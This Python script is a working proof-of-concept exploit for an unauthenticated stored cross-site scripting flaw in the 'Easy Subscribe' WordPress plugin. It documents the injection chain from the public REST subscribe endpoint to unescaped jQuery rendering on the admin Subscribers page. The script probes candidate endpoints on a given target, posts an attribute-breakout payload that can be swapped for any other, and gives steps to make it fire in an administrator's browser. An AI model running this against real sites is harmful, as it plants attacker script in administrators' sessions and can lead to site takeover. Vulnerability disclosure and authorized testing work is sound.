#!/usr/bin/env python3
"""PoC for Unauthenticated Stored XSS via `list`.

Chain: POST /wp-json/easy-subscribe/v1/subscribe (permission_callback=__return_true)
  -> INSERT INTO wp_easy_subscribe (list) via sanitize_text_field (keeps `"`)
  -> Admin opens Subscribers page -> GET esub_get_list_count (Helper::get_lists)
  -> assets/build/admin-subscribers.js: t.append(`<option value="${e}">...`)
     jQuery .append() parses HTML without escaping -> attribute breakout.

Usage:
  python3 poc.py --url http://target/wordpress
  python3 poc.py --url http://target/wordpress/some-page --payload "\" onmouseover=\"alert(1)\" x=\""
"""
import argparse
import json
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

DEFAULT_PAYLOAD = '" onmouseover="alert(1)" onclick="alert(1)" x="'

def build_candidates(url):
    url = url.strip().rstrip("/")
    if "wp-json/easy-subscribe" in url:
        return [url]
    cands = [url + "/wp-json/easy-subscribe/v1/subscribe"]
    p = urllib.parse.urlparse(url)
    origin = "%s://%s" % (p.scheme, p.netloc)
    # walk up sub-paths (supports subdirectory installs like /wordpress)
    parts = p.path.strip("/").split("/") if p.path.strip("/") else []
    for i in range(len(parts) - 1, -1, -1):
        base = origin + "/" + "/".join(parts[:i])
        cand = base.rstrip("/") + "/wp-json/easy-subscribe/v1/subscribe"
        if cand not in cands:
            cands.append(cand)
    if origin + "/wp-json/easy-subscribe/v1/subscribe" not in cands:
        cands.append(origin + "/wp-json/easy-subscribe/v1/subscribe")
    return cands

def post_json(endpoint, data, timeout=15):
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        endpoint,
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": "esub-xss-poc/1.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            return r.status, raw
    except urllib.error.HTTPError as e:
        try:
            raw = e.read().decode("utf-8", "replace")
        except Exception:
            raw = ""
        return e.code, raw
    except Exception as e:
        return None, "connection error: %s" % e

def main():
    ap = argparse.ArgumentParser(description="Easy Subscribe Stored XSS PoC")
    ap.add_argument("--url", required=True, help="Base site URL or page URL, e.g. http://target/wordpress")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload for `list` field")
    ap.add_argument("--email", default=None, help="Email to use (default: random)")
    args = ap.parse_args()

    payload = args.payload
    if len(payload) > 55:
        print("[!] WARNING: payload len %d > VARCHAR(55), will be truncated by DB." % len(payload))
    if "<" in payload or ">" in payload and "<" in payload:
        print("[!] WARNING: payload contains <>, sanitize_text_field will strip tags. Use attribute-breakout without <>.")

    email = args.email
    if not email:
        email = "poc+%d@test.com" % int(time.time() * 1000 % 100000000)

    data = {"email": email, "list": payload, "name": "poc"}
    print("[*] target : %s" % args.url)
    print("[*] email  : %s" % email)
    print("[*] payload: %s (len=%d)" % (payload, len(payload)))

    for ep in build_candidates(args.url):
        print("[*] trying POST %s" % ep)
        status, raw = post_json(ep, data)
        print("    -> HTTP %s : %s" % (status, raw[:300]))
        if status in (200, 201) and ("created" in raw or "exists" in raw):
            print("\n[+] STORED! Server replied with %s" % raw.strip()[:200])
            print("[+] Now as admin (edit_posts) open:")
            base = ep.split("/wp-json/")[0]
            print("    %s/wp-admin/admin.php?page=easy-subscribe-subscribers" % base.rstrip("/"))
            print("[+] In List dropdown, find option: %s" % payload)
            print("[+] Trigger FIREFOX (no console needed): open page, click List dropdown, hover/click malicious option -> alert(1)")
            print("[+] Chrome fallback only if needed: document.querySelector('select[name=\"esub_subscribers_list\"]').size = 5 then hover/click")
            print("[+] Expected HTML: <option value=\"\" onmouseover=\"alert(1)\" onclick=\"alert(1)\" x=\"\">...</option>")
            return 0
        if status == 404:
            continue
    print("\n[-] Exploit failed: no endpoint returned created/exists.")
    return 1

if __name__ == "__main__":
    sys.exit(main())
